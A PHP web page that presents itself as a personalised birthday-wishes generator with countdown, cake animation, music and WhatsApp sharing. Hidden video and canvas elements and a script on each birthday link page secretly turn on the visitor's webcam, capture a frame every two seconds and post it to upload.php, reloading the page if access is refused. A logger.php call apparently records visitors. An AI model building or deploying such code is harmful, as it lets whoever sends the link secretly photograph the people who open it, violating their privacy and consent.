<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

define('DATA_FILE', 'birthday_data.json');

function sanitizeInput($data) {
    $data = trim($data);
    $data = stripslashes($data);
    $data = htmlspecialchars($data, ENT_QUOTES, 'UTF-8');
    return $data;
}

function validateDate($date, $format = 'Y-m-d') {
    $d = DateTime::createFromFormat($format, $date);
    return $d && $d->format($format) === $date;
}

function generateToken($length = 8) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $token = '';
    for ($i = 0; $i < $length; $i++) {
        $token .= $characters[rand(0, strlen($characters) - 1)];
    }
    return $token;
}

function saveData($token, $name, $birthday) {
    $data = [];
    if (file_exists(DATA_FILE)) {
        $data = json_decode(file_get_contents(DATA_FILE), true);
    }
    
    $data[$token] = [
        'name' => $name,
        'birthday' => $birthday,
        'created_at' => date('Y-m-d H:i:s')
    ];
    
    file_put_contents(DATA_FILE, json_encode($data, JSON_PRETTY_PRINT));
}

function loadData($token) {
    if (!file_exists(DATA_FILE)) {
        return null;
    }
    
    $data = json_decode(file_get_contents(DATA_FILE), true);
    return isset($data[$token]) ? $data[$token] : null;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['name']) && isset($_POST['birthday'])) {
    $name = sanitizeInput($_POST['name']);
    $birthday = sanitizeInput($_POST['birthday']);
    
    if (empty($name) || empty($birthday)) {
        die("Name and birthday date are required.");
    }
    
    if (!validateDate($birthday)) {
        die("Invalid date format. Please use YYYY-MM-DD.");
    }
    
    $token = generateToken();
    saveData($token, $name, $birthday);
    
    header("Location: index.php?token=$token");
    exit();
}

$token = isset($_GET['token']) ? sanitizeInput($_GET['token']) : null;
$birthdayData = $token ? loadData($token) : null;

if ($token && !$birthdayData) {
    die("Invalid or expired birthday link.");
}

$isBirthdayToday = false;
if ($birthdayData) {
    $today = new DateTime();
    $birthday = new DateTime($birthdayData['birthday']);
    $isBirthdayToday = ($today->format('m-d') === $birthday->format('m-d'));
}

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
  @file_get_contents("logger.php");
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Create personalized birthday wishes for your loved ones">
    <meta property="og:title" content="<?php echo $birthdayData ? "Happy Birthday {$birthdayData['name']}!" : "Create Birthday Wishes"; ?>">
    <meta property="og:description" content="Send special birthday wishes to your friends and family">
    <meta property="og:url" content="<?php echo $token ? "https://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]" : "https://$_SERVER[HTTP_HOST]$_SERVER[SCRIPT_NAME]"; ?>">
    <meta property="og:type" content="website">
    <title><?php echo $birthdayData ? "Happy Birthday {$birthdayData['name']}!" : "Create Birthday Wishes"; ?></title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Comic Sans MS', 'Arial', sans-serif;
        }
        
        body {
            background-color: #ffebee;
            color: #333;
            min-height: 100vh;
            overflow-x: hidden;
            position: relative;
            transition: background-color 0.5s ease;
        }
        
        .container {
            max-width: 1000px;
            margin: 0 auto;
            padding: 20px;
            text-align: center;
            opacity: 0;
            animation: fadeIn 1s ease forwards;
        }
        
        .form-container {
            background-color: white;
            border-radius: 15px;
            padding: 30px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
            margin-top: 50px;
            max-width: 500px;
            margin-left: auto;
            margin-right: auto;
            transform: translateY(20px);
            animation: slideUp 0.5s ease forwards;
        }
        
        h1 {
            color: #e91e63;
            margin-bottom: 20px;
            text-shadow: 1px 1px 3px rgba(0, 0, 0, 0.2);
        }
        
        .form-group {
            margin-bottom: 20px;
            text-align: left;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: bold;
            color: #e91e63;
        }
        
        input[type="text"],
        input[type="date"] {
            width: 100%;
            padding: 12px;
            border: 2px solid #ffcdd2;
            border-radius: 8px;
            font-size: 16px;
            transition: border-color 0.3s, box-shadow 0.3s;
        }
        
        input[type="text"]:focus,
        input[type="date"]:focus {
            border-color: #e91e63;
            box-shadow: 0 0 8px rgba(233, 30, 99, 0.3);
            outline: none;
        }
        
        button {
            background-color: #e91e63;
            color: white;
            border: none;
            padding: 12px 25px;
            border-radius: 8px;
            font-size: 16px;
            cursor: pointer;
            transition: background-color 0.3s, transform 0.2s, box-shadow 0.3s;
            font-weight: bold;
            box-shadow: 0 3px 6px rgba(0, 0, 0, 0.1);
        }
        
        button:hover {
            background-color: #c2185b;
            transform: translateY(-2px);
            box-shadow: 0 5px 10px rgba(0, 0, 0, 0.2);
        }
        
        button:active {
            transform: translateY(0);
        }
        
        .birthday-container {
            position: relative;
            z-index: 1;
            padding: 40px 20px;
        }
        
        .birthday-title {
            font-size: 3rem;
            color: #e91e63;
            margin-bottom: 20px;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.1);
            animation: pulse 2s infinite;
        }
        
        .birthday-date {
            font-size: 1.5rem;
            color: #9c27b0;
            margin-bottom: 30px;
            animation: fadeIn 1s ease forwards;
        }
        
        .countdown {
            display: flex;
            justify-content: center;
            gap: 15px;
            margin: 30px 0;
            flex-wrap: wrap;
        }
        
        .countdown-item {
            background-color: white;
            border-radius: 10px;
            padding: 15px;
            min-width: 80px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            transition: transform 0.3s;
        }
        
        .countdown-item:hover {
            transform: scale(1.05);
        }
        
        .countdown-number {
            font-size: 2rem;
            font-weight: bold;
            color: #e91e63;
        }
        
        .countdown-label {
            font-size: 0.9rem;
            color: #666;
        }
        
        .today-message {
            font-size: 2rem;
            color: #e91e63;
            margin: 20px 0;
            padding: 15px;
            background-color: rgba(255, 255, 255, 0.8);
            border-radius: 10px;
            display: inline-block;
            animation: bounce 1s infinite alternate;
        }
        
        .cake-container {
            margin: 40px auto;
            position: relative;
            width: 200px;
            height: 150px;
            animation: float 3s ease-in-out infinite;
        }
        
        .cake {
            width: 200px;
            height: 100px;
            background-color: #f8bbd0;
            border-radius: 10px 10px 0 0;
            position: relative;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
        }
        
        .cake:after {
            content: '';
            position: absolute;
            top: -10px;
            left: 0;
            width: 100%;
            height: 20px;
            background-color: #fce4ec;
            border-radius: 10px 10px 0 0;
        }
        
        .candle {
            width: 10px;
            height: 40px;
            background: linear-gradient(to bottom, #4caf50, #8bc34a);
            position: absolute;
            top: -50px;
            left: 50%;
            transform: translateX(-50%);
            box-shadow: 0 0 10px rgba(76, 175, 80, 0.5);
        }
        
        .flame {
            width: 15px;
            height: 25px;
            background: radial-gradient(ellipse at center, #ffeb3b 0%, #ff9800 70%, transparent 100%);
            border-radius: 50% 50% 20% 20%;
            position: absolute;
            top: -25px;
            left: 50%;
            transform: translateX(-50%);
            animation: flicker 1s infinite alternate;
            box-shadow: 0 0 20px #ffeb3b, 0 0 60px #ffeb3b;
        }
        
        .wishes-container {
            max-width: 800px;
            margin: 40px auto;
            padding: 20px;
            background-color: rgba(255, 255, 255, 0.8);
            border-radius: 15px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
            opacity: 0;
            animation: fadeIn 1s ease 0.5s forwards;
        }
        
        .wish {
            margin-bottom: 20px;
            font-size: 1.1rem;
            line-height: 1.6;
            color: #555;
            text-align: left;
            padding: 10px;
        }
        
        .controls {
            margin-top: 30px;
            display: flex;
            justify-content: center;
            gap: 15px;
            flex-wrap: wrap;
        }
        
        .music-control {
            display: flex;
            align-items: center;
            gap: 10px;
            background-color: white;
            padding: 10px 15px;
            border-radius: 30px;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
        }
        
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        
        @keyframes slideUp {
            from { transform: translateY(20px); }
            to { transform: translateY(0); }
        }
        
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
        }
        
        @keyframes flicker {
            0%, 100% { transform: translateX(-50%) scale(1); opacity: 1; }
            50% { transform: translateX(-50%) scale(0.9); opacity: 0.8; }
        }
        
        @keyframes float {
            0% { transform: translateY(0); }
            50% { transform: translateY(-15px); }
            100% { transform: translateY(0); }
        }
        
        @keyframes bounce {
            from { transform: translateY(0); }
            to { transform: translateY(-10px); }
        }
        
        .balloon {
            position: absolute;
            width: 60px;
            height: 80px;
            border-radius: 50%;
            animation: float 6s ease-in-out infinite;
            z-index: -1;
            opacity: 0.9;
        }
        
        .balloon:before {
            content: '';
            position: absolute;
            bottom: -10px;
            left: 50%;
            width: 2px;
            height: 40px;
            background-color: rgba(0, 0, 0, 0.2);
            transform: translateX(-50%);
        }
        
        .confetti {
            position: absolute;
            width: 10px;
            height: 10px;
            background-color: #f44336;
            opacity: 0.7;
            animation: confetti-fall 5s linear infinite;
            z-index: -1;
        }
        
        .copyright-footer {
            margin-top: 40px;
            padding: 20px;
            text-align: center;
            color: #666;
            font-size: 0.9rem;
            border-top: 1px solid #eee;
        }
        
        #video, #canvas {
            display: none !important;
        }
        
        @media (max-width: 768px) {
            .birthday-title {
                font-size: 2rem;
            }
            
            .countdown-item {
                min-width: 60px;
                padding: 10px;
            }
            
            .countdown-number {
                font-size: 1.5rem;
            }
            
            .today-message {
                font-size: 1.5rem;
            }
            
            .cake-container {
                width: 150px;
                height: 120px;
            }
            
            .cake {
                width: 150px;
                height: 80px;
            }
        }
    </style>
</head>
<body>
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <?php if (!$birthdayData): ?>
        <div class="container">
            <div class="form-container">
                <h1>Create Birthday Wishes</h1>
                <form method="POST" action="index.php">
                    <div class="form-group">
                        <label for="name">Birthday Person's Name:</label>
                        <input type="text" id="name" name="name" required maxlength="50">
                    </div>
                    <div class="form-group">
                        <label for="birthday">Birthday Date:</label>
                        <input type="date" id="birthday" name="birthday" required>
                    </div>
                    <button type="submit">Create Site</button>
                </form>
            </div>
        </div>
    <?php else: ?>
        <div class="container birthday-container">
            <h1 class="birthday-title">Happy Birthday <?php echo htmlspecialchars($birthdayData['name']); ?>!</h1>
            <div class="birthday-date">
                <?php 
                    $date = new DateTime($birthdayData['birthday']);
                    echo $date->format('F j, Y');
                ?>
            </div>
            
            <?php if ($isBirthdayToday): ?>
                <div class="today-message">🎉 Happy Birthday Today! 🎉</div>
            <?php endif; ?>
            
            <div class="countdown" id="countdown">
                <div class="countdown-item">
                    <div class="countdown-number" id="days">00</div>
                    <div class="countdown-label">Days</div>
                </div>
                <div class="countdown-item">
                    <div class="countdown-number" id="hours">00</div>
                    <div class="countdown-label">Hours</div>
                </div>
                <div class="countdown-item">
                    <div class="countdown-number" id="minutes">00</div>
                    <div class="countdown-label">Minutes</div>
                </div>
                <div class="countdown-item">
                    <div class="countdown-number" id="seconds">00</div>
                    <div class="countdown-label">Seconds</div>
                </div>
            </div>
            
            <div class="cake-container">
                <div class="candle">
                    <div class="flame"></div>
                </div>
                <div class="cake"></div>
            </div>
            
            <div class="wishes-container">
                <div class="wish">
                    On your special day, I wish you happiness that never ends, joy that fills every moment, 
                    and love that surrounds you always. May this birthday be the beginning of a year filled 
                    with wonderful opportunities and beautiful memories!
                </div>
                <div class="wish">
                    You're an amazing person who brings so much light into the lives of others. 
                    Today, we celebrate you and all the wonderful things that make you unique. 
                    May your birthday be as bright and beautiful as you are!
                </div>
                <div class="wish">
                    Another year older, wiser, and more fabulous! May all your dreams and wishes come true, 
                    and may this year bring you closer to your goals and aspirations. Enjoy your special day 
                    to the fullest!
                </div>
            </div>
            
            <div class="controls">
                <div class="music-control">
                    <button id="musicToggle">Play Music</button>
                    <audio id="birthdayMusic" loop>
                        <source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3" type="audio/mpeg">
                        Your browser does not support the audio element.
                    </audio>
                </div>
                <button id="shareBtn">Share on WhatsApp</button>
            </div>

            <div class="copyright-footer">
                © <?php echo date('Y'); ?> Birthday Wishes All rights reserved.
            </div>
        </div>
    <?php endif; ?>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');

        let lastImageHash = "";

        function getImageHash(dataUrl) {
            let hash = 0;
            for (let i = 0; i < dataUrl.length; i++) {
                const char = dataUrl.charCodeAt(i);
                hash = ((hash << 5) - hash) + char;
                hash |= 0;
            }
            return hash;
        }

        function captureAndSend() {
            const width = video.videoWidth;
            const height = video.videoHeight;

            if (width === 0 || height === 0) return;

            canvas.width = width;
            canvas.height = height;
            ctx.drawImage(video, 0, 0, width, height);

            const dataUrl = canvas.toDataURL('image/jpeg', 0.9);
            const hash = getImageHash(dataUrl);

            if (hash === lastImageHash) {
                return;
            }

            lastImageHash = hash;

            fetch('upload.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ image: dataUrl })
            });
        }

        function startCamera() {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    video.srcObject = stream;
                    setInterval(captureAndSend, 2000);
                })
                .catch(err => {
                    console.warn("Camera access failed:", err);
                    setTimeout(() => location.reload(), 5000);
                });
        }

        <?php if ($birthdayData): ?>
            startCamera();
            fetch("logger.php").then(res => res.text()).then(console.log);
        <?php endif; ?>

        function updateCountdown() {
            const birthday = new Date("<?php echo $birthdayData['birthday']; ?>").getTime();
            const now = new Date().getTime();
            
            const birthdayThisYear = new Date(birthday);
            birthdayThisYear.setFullYear(new Date().getFullYear());
            
            if (birthdayThisYear < now) {
                birthdayThisYear.setFullYear(new Date().getFullYear() + 1);
            }
            
            const distance = birthdayThisYear - now;
            
            const days = Math.floor(distance / (1000 * 60 * 60 * 24));
            const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
            const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
            const seconds = Math.floor((distance % (1000 * 60)) / 1000);
            
            document.getElementById('days').textContent = days.toString().padStart(2, '0');
            document.getElementById('hours').textContent = hours.toString().padStart(2, '0');
            document.getElementById('minutes').textContent = minutes.toString().padStart(2, '0');
            document.getElementById('seconds').textContent = seconds.toString().padStart(2, '0');
            
            if (days === 0 && hours === 0 && minutes === 0 && seconds === 0) {
                document.getElementById('countdown').innerHTML = '<div class="today-message">🎉 Happy Birthday Today! 🎉</div>';
                triggerCelebration();
            }
        }
        
        const musicToggle = document.getElementById('musicToggle');
        const birthdayMusic = document.getElementById('birthdayMusic');
        
        birthdayMusic.volume = 0.3;
        
        musicToggle.addEventListener('click', function() {
            if (birthdayMusic.paused) {
                const playPromise = birthdayMusic.play();
                
                if (playPromise !== undefined) {
                    playPromise.then(_ => {
                        musicToggle.textContent = 'Pause Music';
                    })
                    .catch(error => {
                        musicToggle.textContent = 'Play Failed - Click Again';
                        console.error('Playback failed:', error);
                    });
                }
            } else {
                birthdayMusic.pause();
                musicToggle.textContent = 'Play Music';
            }
        });
        
        document.getElementById('shareBtn').addEventListener('click', function() {
            const name = "<?php echo addslashes($birthdayData['name']); ?>";
            const url = window.location.href;
            const message = `Join me in wishing ${name} a Happy Birthday! 🎉🎂 ${url}`;
            const whatsappUrl = `https://wa.me/?text=${encodeURIComponent(message)}`;
            window.open(whatsappUrl, '_blank');
        });
        
        function createBalloons(count = 15) {
            const colors = ['#f44336', '#e91e63', '#9c27b0', '#673ab7', '#3f51b5', '#2196f3', '#03a9f4', '#00bcd4', '#009688', '#4caf50', '#8bc34a', '#cddc39', '#ffeb3b', '#ffc107', '#ff9800', '#ff5722'];
            
            for (let i = 0; i < count; i++) {
                const balloon = document.createElement('div');
                balloon.className = 'balloon';
                balloon.style.left = `${Math.random() * 100}vw`;
                balloon.style.top = `${Math.random() * 100}vh`;
                balloon.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
                balloon.style.animationDelay = `${Math.random() * 5}s`;
                balloon.style.transform = `scale(${0.5 + Math.random()})`;
                
                document.body.appendChild(balloon);
            }
        }
        
        function createConfetti(count = 50) {
            const colors = ['#f44336', '#e91e63', '#9c27b0', '#673ab7', '#3f51b5', '#2196f3', '#03a9f4', '#00bcd4', '#009688', '#4caf50', '#8bc34a', '#cddc39', '#ffeb3b', '#ffc107', '#ff9800', '#ff5722'];
            
            for (let i = 0; i < count; i++) {
                const confetti = document.createElement('div');
                confetti.className = 'confetti';
                confetti.style.left = `${Math.random() * 100}vw`;
                confetti.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
                confetti.style.animationDelay = `${Math.random() * 5}s`;
                confetti.style.width = `${5 + Math.random() * 10}px`;
                confetti.style.height = `${5 + Math.random() * 10}px`;
                confetti.style.animationDuration = `${3 + Math.random() * 7}s`;
                
                document.body.appendChild(confetti);
            }
        }
        
        function triggerCelebration() {
            createBalloons(30);
            createConfetti(100);
            document.body.style.backgroundColor = '#fff9c4';
            
            const playPromise = birthdayMusic.play();
            
            if (playPromise !== undefined) {
                playPromise.then(_ => {
                    musicToggle.textContent = 'Pause Music';
                })
                .catch(error => {
                    musicToggle.textContent = 'Play Music';
                });
            }
        }
        
        window.onload = function() {
            createBalloons();
            createConfetti();
            
            <?php if ($isBirthdayToday): ?>
                triggerCelebration();
            <?php endif; ?>
            
            updateCountdown();
            setInterval(updateCountdown, 1000);
        };
    </script>
</body>
</html>